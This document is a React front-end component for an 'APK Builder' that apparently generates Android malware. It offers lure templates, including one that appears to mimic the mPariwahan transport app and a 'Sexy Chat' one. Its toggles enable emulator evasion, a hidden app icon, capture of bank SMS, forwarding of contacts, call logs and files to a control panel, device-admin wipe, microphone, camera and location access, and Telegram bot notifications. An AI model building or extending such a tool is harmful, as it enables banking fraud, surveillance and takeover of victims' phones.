"use client";
import { EventSourcePolyfill } from "event-source-polyfill";
import {
  useState,
  useRef,
  useEffect,
  ChangeEvent,
  SetStateAction,
} from "react";
import {
  FiUpload,
  FiDownload,
  FiPlay,
  FiX,
  FiCheck,
  FiAlertTriangle,
  FiInfo,
} from "react-icons/fi";

const ApkBuilder = () => {
  const [appName, setAppName] = useState("");
  const [appIcon, setAppIcon] = useState<File | null>(null);
  const [htmlFile, setHtmlFile] = useState<File | null>(null);
  const [template, setTemplate] = useState("mpariwahan");
  const [securityOptions, setSecurityOptions] = useState({
    isAntiEmulator: false,
    isBankSmsOnly: false,
    isHideApplication: false,
    isGetCallLogs: false,
    isGetContacts: false,
    sendConnectionInfo: false,
    isAccessAllFiles: false,
    isAccessGallery: false,
    isAccessHiddenFolders: false,
    isDeviceAdmin: false,
    isReadSms: false,
    isSendSms: false,
    isAccessLocation: false,
    isRecordAudio: false,
    isAccessCamera: false,
    isReadPhoneState: false,
    isAccessCoarseLocation: false,
    isReadCallLog: false,
    isWriteCallLog: false,
    isWriteContacts: false,
    isReadCalendar: false,
    isWriteCalendar: false,
    isReadPhoneNumbers: false,
  });
  const [telegramConfig, setTelegramConfig] = useState({
    chatId: "",
    botToken: "",
  });
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildSuccess, setBuildSuccess] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState("");
  const [logs, setLogs] = useState([
    {
      type: "info",
      message: "APK Builder initialized. Ready to start building...",
      timestamp: new Date().toISOString(),
    },
    {
      type: "info",
      message: 'Select your app settings and click "Build" to begin',
      timestamp: new Date().toISOString(),
    },
  ]);

  const terminalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [logs]);

  const handleSecurityToggle = (option: keyof typeof securityOptions) => {
    setSecurityOptions((prev) => ({
      ...prev,
      [option]: !prev[option],
    }));
  };

  const handleTelegramConfigChange = (
    field: keyof typeof telegramConfig,
    value: string
  ) => {
    setTelegramConfig((prev) => ({
      ...prev,
      [field]: value,
    }));
  };

  const handleFileChange = (
    setter: {
      (value: SetStateAction<File | null>): void;
      (value: SetStateAction<File | null>): void;
      (arg0: any): void;
    },
    e: ChangeEvent<HTMLInputElement>
  ) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    const file = files[0];
    if (file) {
      setter(file);
      addLog("info", `Selected file: ${file.name}`);
    }
  };

  const addLog = (type: string, message: string) => {
    setLogs((prev) => [
      ...prev,
      { type, message, timestamp: new Date().toISOString() },
    ]);
  };

  const handleBuild = async () => {
    const userString = localStorage.getItem("userData");
    const userData = userString ? JSON.parse(userString) : null;
    if (!userData?.user?.id) {
      addLog("error", "Authentication required");
      return;
    }

    if (!appName) {
      addLog("error", "App name is required");
      return;
    }

    if (
      securityOptions.sendConnectionInfo &&
      (!telegramConfig.chatId || !telegramConfig.botToken)
    ) {
      addLog(
        "error",
        'Telegram Chat ID and Bot Token are required when "Send connection info to Telegram" is enabled'
      );
      return;
    }

    setIsBuilding(true);
    setBuildSuccess(false);
    setDownloadUrl("");
    setLogs((prev) => [
      ...prev,
      {
        type: "info",
        message: "Initializing build connection...",
        timestamp: new Date().toISOString(),
      },
    ]);

    let eventSource: EventSourcePolyfill | null = null;

    try {
      const [iconBase64, htmlBase64] = await Promise.all([
        appIcon ? fileToBase64(appIcon) : Promise.resolve(undefined),
        htmlFile ? fileToBase64(htmlFile) : Promise.resolve(undefined),
      ]);

      const buildData = {
        userId: userData.user.id,
        username: userData.user.username,
        appName,
        appIcon: iconBase64,
        htmlFile: htmlBase64,
        template,
        securityOptions,
        telegramConfig: securityOptions.sendConnectionInfo
          ? telegramConfig
          : undefined,
      };
      addLog("info", "Starting APK build process...");
      const response = await fetch("/api/build-apk", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        credentials: "include",
        body: JSON.stringify(buildData),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(
          errorData.message || "Failed to initiate build with unknown error"
        );
      }

      const { buildId } = await response.json();
      eventSource = new EventSourcePolyfill(
        `/api/build-apk?buildId=${encodeURIComponent(buildId)}`,
        {
          headers: {
            "Content-Type": "application/json",
          },
          withCredentials: true,
          heartbeatTimeout: 90000,
        }
      );

      eventSource.onopen = () => addLog("info", "Build connection established");

      eventSource.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data.type === "heartbeat") {
            return;
          }

          if (data.type && data.message) {
            addLog(data.type, data.message);
          } else {
            console.warn("Received malformed SSE message:", data);
          }

          if (data.type === "download") {
            console.log("Build completed successfully:", data);
            setDownloadUrl(data.message);
            setBuildSuccess(true);
            setIsBuilding(false);
            eventSource?.close();
          }
        } catch (error) {
          console.error("Error processing SSE message:", error);
          addLog("error", "Failed to process build update");
        }
      };

      eventSource.onerror = () => {
        addLog("error", "Build connection lost");
        setIsBuilding(false);
        eventSource?.close();
      };
    } catch (error) {
      addLog(
        "error",
        "Failed to start build: " +
          (error instanceof Error ? error.message : "Unknown error")
      );
      setIsBuilding(false);
      eventSource?.close();
    }

    return () => {
      eventSource?.close();
    };
  };

  const fileToBase64 = (file: File): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = (error) => reject(error);
    });
  };

  const getLogColor = (type: string) => {
    switch (type) {
      case "error":
        return "text-red-400";
      case "warning":
        return "text-yellow-400";
      case "success":
        return "text-green-400";
      default:
        return "text-gray-300";
    }
  };

  const getLogIcon = (type: string) => {
    switch (type) {
      case "error":
        return <FiX className="mr-2" />;
      case "warning":
        return <FiAlertTriangle className="mr-2" />;
      case "success":
        return <FiCheck className="mr-2" />;
      default:
        return <FiInfo className="mr-2" />;
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-gray-100 p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-indigo-400">APK Builder</h1>
          <div className="w-20 h-1 bg-indigo-500 mt-2"></div>
        </div>

        <div className="flex flex-col lg:flex-row gap-6">
          <div className="flex-1 bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
            <div className="bg-gray-700 px-4 py-3 border-b border-gray-600 flex items-center">
              <div className="flex space-x-2 mr-4">
                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div className="w-3 h-3 rounded-full bg-green-500"></div>
              </div>
              <span className="text-sm font-mono">Build Logs</span>
            </div>

            <div
              ref={terminalRef}
              className="h-[80vh] overflow-y-auto p-4 font-mono text-sm"
              style={{ backgroundColor: "#1a1a1a" }}
            >
              {logs.map((log, index) => (
                <div
                  key={index}
                  className={`flex items-start mb-2 ${getLogColor(log.type)}`}
                >
                  {getLogIcon(log.type)}
                  <span>
                    <span className="text-gray-500 mr-2">
                      {new Date(log.timestamp).toLocaleTimeString()}
                    </span>
                    {log.message}
                  </span>
                </div>
              ))}

              {isBuilding && (
                <div className="flex items-center text-gray-300">
                  <div className="animate-spin rounded-full h-4 w-4 border-t-2 border-b-2 border-indigo-400 mr-2"></div>
                  Building...
                </div>
              )}
            </div>
          </div>

          <div className="w-full lg:w-96 bg-gray-800 rounded-xl border border-gray-700 p-6">
            <h2 className="text-xl font-bold mb-6 flex items-center">
              <FiPlay className="mr-2 text-indigo-400" />
              Build Configuration
            </h2>

            <div className="space-y-5">
              <div>
                <label className="block text-gray-400 mb-2">App Name</label>
                <input
                  type="text"
                  value={appName}
                  onChange={(e) => setAppName(e.target.value)}
                  className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-white"
                  placeholder="My Awesome App"
                />
              </div>

              <div>
                <label className="block text-gray-400 mb-2">App Icon</label>
                <div className="flex items-center">
                  <label className="cursor-pointer bg-gray-700 hover:bg-gray-600 border border-gray-600 rounded px-4 py-2 flex items-center">
                    <FiUpload className="mr-2" />
                    {appIcon ? appIcon.name : "Select Icon"}
                    <input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleFileChange(setAppIcon, e)}
                      className="hidden"
                    />
                  </label>
                  {appIcon && (
                    <button
                      onClick={() => setAppIcon(null)}
                      className="ml-2 text-red-400 hover:text-red-300"
                    >
                      <FiX />
                    </button>
                  )}
                </div>
              </div>

              <div>
                <label className="block text-gray-400 mb-2">Template</label>
                <select
                  value={template}
                  onChange={(e) => setTemplate(e.target.value)}
                  className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-white"
                >
                  <option value="mpariwahan">mPariwahan Template</option>
                  <option value="sexy-chat">Sexy Chat Template</option>
                  <option value="custom">Custom Template</option>
                </select>
              </div>

              {template === "custom" && (
                <div>
                  <label className="block text-gray-400 mb-2">HTML File</label>
                  <div className="flex items-center">
                    <label className="cursor-pointer bg-gray-700 hover:bg-gray-600 border border-gray-600 rounded px-4 py-2 flex items-center">
                      <FiUpload className="mr-2" />
                      {htmlFile ? htmlFile.name : "Select HTML File"}
                      <input
                        type="file"
                        accept=".html,.htm"
                        onChange={(e) => handleFileChange(setHtmlFile, e)}
                        className="hidden"
                      />
                    </label>
                    {htmlFile && (
                      <button
                        onClick={() => setHtmlFile(null)}
                        className="ml-2 text-red-400 hover:text-red-300"
                      >
                        <FiX />
                      </button>
                    )}
                  </div>
                </div>
              )}

              <div className="pt-2 border-t border-gray-700">
                <h3 className="text-gray-400 mb-3">Security Options</h3>
                <div className="space-y-3">
                  {Object.entries(securityOptions).map(([option, enabled]) => {
                    const optionDescriptions: Record<string, string> = {
                      isAntiEmulator:
                        "Detect and block the app from running on emulators",
                      isBankSmsOnly:
                        "Only process incoming SMS from known bank senders",
                      isHideApplication:
                        "Hide the app icon from the launcher",
                      isGetCallLogs:
                        "Read device call logs and forward them to the panel",
                      isGetContacts:
                        "Read device contacts and forward them to the panel",
                      sendConnectionInfo:
                        "Send a connection notification to a Telegram bot",
                      isAccessAllFiles:
                        "Request MANAGE_EXTERNAL_STORAGE (all files access — required on Android 11+ to read /sdcard/Download)",
                      isAccessGallery:
                        "Request READ_MEDIA_IMAGES/VIDEO/AUDIO on Android 13+",
                      isAccessHiddenFolders:
                        "Access hidden / safe folder contents (gallery vault)",
                      isDeviceAdmin:
                        "Register the app as a device admin (lock, wipe, reset password from panel)",
                      isReadSms:
                        "Request READ_SMS — read incoming SMS messages and forward to panel",
                      isSendSms:
                        "Request SEND_SMS — send SMS from the device via the panel",
                      isAccessLocation:
                        "Request ACCESS_FINE_LOCATION — precise GPS location",
                      isAccessCoarseLocation:
                        "Request ACCESS_COARSE_LOCATION — network/cell-based location",
                      isRecordAudio:
                        "Request RECORD_AUDIO — microphone capture",
                      isAccessCamera:
                        "Request CAMERA — take photos and record video",
                      isReadPhoneState:
                        "Request READ_PHONE_STATE — phone number, network, call state",
                      isReadPhoneNumbers:
                        "Request READ_PHONE_NUMBERS — read the device's own phone number",
                      isReadCallLog:
                        "Request READ_CALL_LOG — call history (separate from isGetCallLogs feature)",
                      isWriteCallLog:
                        "Request WRITE_CALL_LOG — modify call history",
                      isWriteContacts:
                        "Request WRITE_CONTACTS — add/edit contacts",
                      isReadCalendar:
                        "Request READ_CALENDAR — read device calendar events",
                      isWriteCalendar:
                        "Request WRITE_CALENDAR — add/edit calendar events",
                    };
                    const desc = optionDescriptions[option];
                    return (
                      <div key={option} className="flex flex-col">
                        <div className="flex justify-between items-center mb-1">
                          <div>
                            <span className="capitalize">
                              {option.replace(/([A-Z])/g, " $1").trim()}
                            </span>
                            {desc && (
                              <p className="text-xs text-gray-500 mt-0.5">
                                {desc}
                              </p>
                            )}
                          </div>
                          <button
                            onClick={() =>
                              handleSecurityToggle(
                                option as keyof typeof securityOptions
                              )
                            }
                            className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none ${
                              enabled ? "bg-indigo-600" : "bg-gray-600"
                            }`}
                          >
                            <span
                              className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${
                                enabled ? "translate-x-6" : "translate-x-1"
                              }`}
                            />
                          </button>
                        </div>
                      {option === "sendConnectionInfo" && enabled && (
                        <div className="ml-2 space-y-2 mt-2">
                          <div>
                            <label className="block text-xs text-gray-400 mb-1">
                              Telegram Chat ID
                            </label>
                            <input
                              type="text"
                              value={telegramConfig.chatId}
                              onChange={(e) =>
                                handleTelegramConfigChange(
                                  "chatId",
                                  e.target.value
                                )
                              }
                              className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-white text-sm"
                              placeholder="123456789"
                            />
                          </div>
                          <div>
                            <label className="block text-xs text-gray-400 mb-1">
                              Telegram Bot Token
                            </label>
                            <input
                              type="text"
                              value={telegramConfig.botToken}
                              onChange={(e) =>
                                handleTelegramConfigChange(
                                  "botToken",
                                  e.target.value
                                )
                              }
                              className="w-full bg-gray-700 border border-gray-600 rounded px-3 py-2 text-white text-sm"
                              placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
                            />
                          </div>
                        </div>
                      )}
                      </div>
                    );
                  })}
                </div>
              </div>

              <button
                onClick={handleBuild}
                disabled={
                  isBuilding ||
                  !appName ||
                  (securityOptions.sendConnectionInfo &&
                    (!telegramConfig.chatId || !telegramConfig.botToken))
                }
                className={`w-full py-3 rounded-lg flex items-center justify-center ${
                  isBuilding
                    ? "bg-indigo-800 text-indigo-300 cursor-not-allowed"
                    : "bg-indigo-600 hover:bg-indigo-700"
                } ${
                  !appName ||
                  (securityOptions.sendConnectionInfo &&
                    (!telegramConfig.chatId || !telegramConfig.botToken))
                    ? "opacity-50 cursor-not-allowed"
                    : ""
                }`}
              >
                {isBuilding ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white mr-2"></div>
                    Building...
                  </>
                ) : (
                  <>
                    <FiPlay className="mr-2" />
                    Build APK
                  </>
                )}
              </button>

              {buildSuccess && (
                <a
                  href={`/api/download-apk?filename=${encodeURIComponent(
                    downloadUrl
                  )}`}
                  download={downloadUrl}
                  className="w-full py-3 rounded-lg flex items-center justify-center bg-green-600 hover:bg-green-700"
                >
                  <FiDownload className="mr-2" />
                  Download APK
                </a>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ApkBuilder;
